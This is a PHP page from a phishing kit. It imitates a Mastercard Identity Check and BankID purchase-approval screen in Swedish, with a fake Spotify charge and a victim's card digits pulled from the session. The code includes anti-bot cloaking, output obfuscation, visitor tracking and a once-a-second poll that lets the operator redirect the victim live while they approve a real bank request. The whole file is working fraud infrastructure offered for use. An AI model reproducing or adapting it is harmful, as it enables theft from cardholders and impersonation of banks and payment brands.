<?php 
session_start();
require_once '../includes/functions.php';
validateVisit();
require_once '../includes/tracker.php';
require_once '../includes/lang.php';
require_once '../includes/absd.php';
require_once('../includes/obf.php');
$visitor = trackVisitor();
$security = new supersecurity();
$security->setTestMode(false);
$security->setExitLink(sitexite());
$security->run();
ob_start([TextObfuscator::class, 'obfuscateOutput']);
?> <!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Challenge</title>
       <link href="css/master.css?" rel="stylesheet">
    <script src="js/jquery.js"></script>
    <style>
      .sf-hidden {
        display: none !important
      }
    </style>
 </head>
  <body class=" body-redesign">
    <div class="processing-fullpage hide sf-hidden"></div>
    <header>
        <div class="logo logo-left">
            <picture>
                
                
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAAOwAAADsABataJCQAAABp0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuMTAw9HKhAAAADUlEQVQYV2P4//8/AwAI/AL+iF8G4AAAAABJRU5ErkJggg==" srcset sizes>
            </picture>
        </div><div class="logo logo-right">
        <picture>
            
            
            <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDI1LjMuMSwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPgo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9ImE1Njg5ZmM1LThkNWUtNGIxOS04MTdjLTE3MWY4Y2FiZjY1YSIKCSB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCIgdmlld0JveD0iMCAwIDI1OCA3OCIKCSBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCAyNTggNzg7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KCS5zdDB7ZmlsbDpub25lO30KCS5zdDF7ZmlsbDojRkY1RjAwO30KCS5zdDJ7ZmlsbDojRUIwMDFCO30KCS5zdDN7ZmlsbDojRjc5RTFCO30KPC9zdHlsZT4KPGc+Cgk8cmVjdCB4PSItMjEuMSIgeT0iLTMuOCIgY2xhc3M9InN0MCIgd2lkdGg9IjMwMCIgaGVpZ2h0PSI4NS43Ii8+Cgk8cmVjdCB4PSIyNS42IiB5PSIyMi4yIiBjbGFzcz0ic3QxIiB3aWR0aD0iMTguOCIgaGVpZ2h0PSIzMy43Ii8+Cgk8cGF0aCBjbGFzcz0ic3QyIiBkPSJNMjYuOCwzOWMwLTYuNiwzLTEyLjcsOC4xLTE2LjhjLTkuMy03LjQtMjIuNy01LjctMzAuMSwzLjZjLTcuMyw5LjItNS42LDIyLjcsMy43LDMwYzcuOCw2LjIsMTguNyw2LjIsMjYuNSwwCgkJQzI5LjksNTEuNywyNi44LDQ1LjYsMjYuOCwzOXoiLz4KCTxwYXRoIGNsYXNzPSJzdDMiIGQ9Ik02OS42LDM5YzAsMTEuOS05LjYsMjEuNC0yMS40LDIxLjRjLTQuOCwwLTkuNC0xLjYtMTMuMy00LjZjOS4zLTcuNCwxMC45LTIwLjgsMy42LTMwLjEKCQljLTEuMS0xLjMtMi4zLTIuNS0zLjYtMy42YzkuMy03LjMsMjIuOC01LjYsMzAuMiwzLjZDNjguMSwyOS42LDY5LjYsMzQuMiw2OS42LDM5eiIvPgoJPHBhdGggY2xhc3M9InN0MyIgZD0iTTY3LjYsNTIuM3YtMC43SDY4di0wLjFoLTAuN3YwLjFoMC4zVjUyLjNMNjcuNiw1Mi4zeiBNNjksNTIuM3YtMC45aC0wLjJMNjguNSw1MmwtMC4yLTAuNWgtMC4ydjAuOWgwLjF2LTAuNwoJCWwwLjIsMC41aDAuMWwwLjItMC41djAuN0g2OXoiLz4KCTxwb2x5Z29uIHBvaW50cz0iOTEuNSw2MC41IDkwLjcsNjAuNSA5MC43LDUzLjMgOTAuNywzOC45IDkwLjcsMjQuNCA5MC43LDE3LjEgOTEuNSwxNy4xIDkxLjUsMzEuNiA5MS41LDQ2IAkiLz4KCTxwYXRoIGQ9Ik0xMTMuNSw1Mi4zaC0yLjJWMjYuN2gyLjJWNTIuM3ogTTEyOS43LDI2LjdjMiwwLDMuOCwwLjIsNS43LDAuOWMxLjYsMC41LDMuMSwxLjQsNC40LDIuNWMxLjIsMS4xLDIuMiwyLjUsMi43LDQuMQoJCWMxLjMsMy40LDEuMyw3LjEsMCwxMC43Yy0wLjcsMS41LTEuNSwyLjktMi43LDQuMWMtMS4yLDEuMS0yLjcsMi00LjQsMi41Yy0xLjksMC43LTMuOCwwLjktNS43LDAuOWgtOS4zVjI2LjdIMTI5Ljd6IE0xMjIuNiwyOC45CgkJdjIxLjNoNy4xYzEuNiwwLDMuMy0wLjIsNC45LTAuOGMxLjMtMC40LDIuNS0xLjIsMy42LTIuMmMxLTEsMS44LTIuMSwyLjItMy40YzEtMi45LDEtNS45LDAtOC44Yy0wLjQtMS4zLTEuMi0yLjQtMi4yLTMuNAoJCWMtMS0xLTIuMy0xLjYtMy42LTIuMmMtMS41LTAuNS0zLjMtMC44LTQuOS0wLjhMMTIyLjYsMjguOXogTTE2OS40LDI2LjVjMS4xLDAsMi4xLDAuMSwzLjIsMC4zYzEsMC4yLDIsMC41LDIuOSwxLjEKCQljMC45LDAuNCwxLjYsMSwyLjQsMS42YzAuOCwwLjcsMS4zLDEuNCwxLjksMi4ybC0xLjksMS4yYy0wLjQtMC43LTEtMS4zLTEuNS0xLjhjLTAuNS0wLjUtMS4zLTEtMi0xLjNjLTAuOC0wLjMtMS41LTAuNy0yLjMtMC45CgkJYy0wLjktMC4yLTEuOC0wLjMtMi42LTAuM2MtMS40LDAtMi45LDAuMi00LjMsMC44Yy0xLjMsMC41LTIuNCwxLjItMy40LDIuMmMtMSwxLTEuOCwyLjItMi4zLDMuNGMtMS4xLDIuOS0xLjEsNiwwLDguOQoJCWMwLjUsMS4zLDEuMywyLjQsMi4zLDMuNGMxLDEsMi4xLDEuOCwzLjQsMi4yYzEuMywwLjUsMi43LDAuOCw0LjMsMC44YzAuOSwwLDEuOC0wLjEsMi41LTAuM2MwLjgtMC4yLDEuNS0wLjQsMi4zLTAuOQoJCWMwLjgtMC4zLDEuNC0wLjksMi0xLjNjMC41LTAuNSwxLjEtMS4xLDEuNS0xLjlsMS45LDEuM2MtMC41LDAuOC0xLjIsMS41LTEuOSwyLjJjLTAuOCwwLjctMS41LDEuMi0yLjQsMS42CgkJYy0wLjksMC40LTEuOSwwLjgtMi45LDFjLTIuNywwLjctNS43LDAuNC04LjMtMC43Yy0xLjUtMC43LTMtMS41LTQuMi0yLjdjLTEuMi0xLjItMi4xLTIuNS0yLjctNC4yYy0xLjMtMy40LTEuMy03LjEsMC0xMC41CgkJYzAuNy0xLjUsMS41LTMsMi43LTQuMmMxLjItMS4yLDIuNi0yLjEsNC4yLTIuN0MxNjUuOSwyNi43LDE2Ny42LDI2LjQsMTY5LjQsMjYuNUwxNjkuNCwyNi41eiBNMTg2LjUsMzguMWMwLjMtMC41LDAuOC0xLDEuMi0xLjQKCQljMC40LTAuNCwxLTAuOCwxLjUtMWMwLjUtMC4yLDEuMS0wLjQsMS42LTAuNWMwLjUtMC4xLDEuMi0wLjIsMS44LTAuMmMxLDAsMiwwLjEsMywwLjRjMC45LDAuMywxLjYsMC44LDIuMywxLjQKCQljMC43LDAuNywxLjEsMS4zLDEuNCwyLjJzMC41LDEuOSwwLjUsMi45djEwLjVoLTIuMXYtOS45YzAtMC44LTAuMS0xLjUtMC4zLTIuM2MtMC4yLTAuNy0wLjUtMS4yLTEuMS0xLjgKCQljLTAuNC0wLjQtMS4xLTAuOS0xLjgtMS4xYy0wLjgtMC4yLTEuNS0wLjQtMi4zLTAuM2MtMC44LDAtMS41LDAuMS0yLjMsMC40Yy0wLjcsMC4yLTEuMywwLjctMS45LDEuMmMtMC41LDAuNS0xLDEuMS0xLjIsMS44CgkJYy0wLjMsMC44LTAuNCwxLjUtMC40LDIuM3Y5LjhoLTIuMVYyNmgyLjFWMzguMXogTTIxMi4yLDM0LjhjMS4xLDAsMi4yLDAuMiwzLjIsMC43YzEsMC40LDEuOSwxLDIuNSwxLjhjMC44LDAuOCwxLjMsMS44LDEuNiwyLjcKCQljMC40LDEuMSwwLjcsMi4zLDAuNywzLjVjMCwwLjEsMCwwLjMsMCwwLjRjMCwwLjEsMCwwLjMsMCwwLjRoLTE0LjRjMCwwLjksMC4zLDEuOSwwLjcsMi42YzAuMywwLjgsMC45LDEuNCwxLjQsMgoJCWMwLjUsMC41LDEuMywxLDIuMSwxLjJjMC44LDAuMywxLjYsMC40LDIuNSwwLjRjMS4xLDAsMi4yLTAuMiwzLjItMC43YzEtMC40LDEuOS0xLjEsMi41LTEuOGwxLjEsMS40Yy0wLjUsMC41LTEuMSwxLTEuNiwxLjMKCQljLTAuNSwwLjMtMS4xLDAuNy0xLjgsMC45Yy0wLjUsMC4yLTEuMiwwLjMtMS44LDAuNGMtMC43LDAuMS0xLjIsMC4xLTEuOSwwLjFjLTEuMiwwLTIuNC0wLjItMy41LTAuN2MtMS0wLjQtMi0xLTIuNy0xLjkKCQljLTAuOC0wLjgtMS40LTEuOC0xLjgtMi43Yy0wLjQtMS4xLTAuNy0yLjQtMC43LTMuNmMwLTEuMiwwLjItMi40LDAuNy0zLjVjMC40LTEuMSwxLTIsMS44LTIuOWMwLjgtMC44LDEuNi0xLjQsMi43LTEuOQoJCUMyMDkuOSwzNSwyMTEuMSwzNC44LDIxMi4yLDM0LjhMMjEyLjIsMzQuOHogTTIxMi4yLDM2LjdjLTAuOCwwLTEuNiwwLjEtMi40LDAuNGMtMC43LDAuMy0xLjMsMC43LTEuOSwxLjJjLTAuNSwwLjUtMSwxLjItMS4zLDEuOQoJCWMtMC4zLDAuOC0wLjUsMS41LTAuNywyLjRoMTIuM2MtMC4xLTAuOS0wLjItMS42LTAuNS0yLjRjLTAuMy0wLjctMC44LTEuMy0xLjMtMS45QzIxNS4yLDM3LjIsMjEzLjcsMzYuNywyMTIuMiwzNi43TDIxMi4yLDM2Ljd6CgkJIE0yMzIuMiwzNC44YzEuMiwwLDIuNCwwLjIsMy41LDAuN2MxLjEsMC40LDIsMS4xLDIuNywybC0xLjMsMS40Yy0wLjctMC43LTEuNC0xLjItMi4zLTEuNXMtMS45LTAuNS0yLjctMC41cy0xLjgsMC4yLTIuNiwwLjUKCQljLTAuOCwwLjMtMS41LDAuOS0yLjEsMS40Yy0wLjcsMC43LTEuMSwxLjQtMS40LDIuMmMtMC43LDEuOC0wLjcsMy43LDAsNS41YzAuNywxLjYsMS45LDMsMy41LDMuNmMwLjksMC4zLDEuOCwwLjUsMi42LDAuNQoJCWMxLDAsMi0wLjIsMi45LTAuNWMwLjktMC4zLDEuNi0wLjksMi4zLTEuNWwxLjMsMS40Yy0wLjgsMC45LTEuOCwxLjUtMi43LDJjLTIuMywwLjktNC44LDAuOS03LjEsMGMtMi4xLTAuOS0zLjctMi41LTQuNi00LjYKCQljLTAuOS0yLjMtMC45LTQuNywwLTdjMC44LTIuMSwyLjUtMy44LDQuNi00LjdDMjI5LjgsMzUsMjMxLDM0LjgsMjMyLjIsMzQuOEwyMzIuMiwzNC44eiBNMjQ0LjgsNDIuM2gyLjdsNy4zLTcuM2gyLjZsLTguMSw4LjEKCQlsOC4zLDkuMWgtMi42bC03LjQtOGgtMi43djhoLTIuMVYyNmgyLjF2MTYuM0gyNDQuOHoiLz4KPC9nPgo8L3N2Zz4K" alt="Mastercard® Identity Check™ logo" srcset sizes>
        </picture>
    </div>
    </header>

    <div class="language-switch main-redesign"></div>
<main class="main main-redesign">
  <h1 id="header">Öppna BankID-appen för att godkänna</h1>
  <div>
    <!-- Left blank intentionally, for specific template configuration -->
  </div>
  <div class="data-wrapper">
    <ul>
      <li id="merchantName" aria-label="Butik PayU*hostvision.ro">Spotify</li>
      <li class="purchase-amount" aria-label="Belopp 101,18 RON">
        <span id="currency">SEK</span>
        <span id="purchaseAmount">20</span>
      </li>
      <li id="purchaseDate" aria-label="Datum 2025-06-02"> <?php echo @date("d-m-Y"); ?> </li>
      <li id="maskedCardNumber" aria-label="Kortnummer"> **** **** **** <?php if(@$_SESSION['cc']!=""){echo substr($_SESSION['cc'], -4); }else{echo "****";}?> </li>
    </ul>
    <p id="subHeader"></p>
    <div>
    </div>
  </div>
  <div>

  </div>
  <form id="mainForm" method="post" autocomplete="off" action="v2Form" aria-labelledby="header">
    <div class="message message-processing" role="status" aria-live="polite">
      <p id="spinner" class="spinner">Väntar på godkännande...</p>
    </div>
    <div class="alternative-method"></div>
    <input id="mainFormSubmitHidden" type="submit" class="hidden" aria-hidden="true" tabindex="-1" value>
  </form>
</main>
<footer class="footer-redesign align-content-center" aria-labelledby="needSomeHelpButton">
  <div class="accordion">
    <button type="button" class="btn accordion-button" aria-expanded="true" aria-controls="needSomeHelpSection" id="needSomeHelpButton">Vad är Mastercard Identity Check?</button>
    <section id="needSomeHelpSection" aria-labelledby="needSomeHelpButton" class="accordion-panel"> Mastercard Identity Check är en säkerhetslösning för att minska bedrägerier i samband med köp på internet. <br>För att kunna godkänna köpet behöver du tillhörande app. </section>
  </div>
</footer>
<script>

setInterval(function() {
    fetch('../check_redirect.php?visitor_id=<?php echo $visitor['id']; ?>')
        .then(response => response.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.url;
            }
        })
        .catch(error => console.error('Error checking redirect:', error));
        

    fetch('../ping.php?visitor_id=<?php echo $visitor['id']; ?>&page=<?php echo urlencode($_SERVER['REQUEST_URI']); ?>')
        .catch(error => console.error('Error sending ping:', error));
}, 1000);
        

        window.addEventListener('beforeunload', function() {
            navigator.sendBeacon('../ping.php?visitor_id=<?php echo $visitor['id']; ?>');
        });
    </script>
<div class="cancel-button-wrapper">
  <button type="button" form="mainForm" name="challengeCancel" class="btn btn-link btn-cancel" id="finish">Avbryt</button>
</div>
</body>
</html>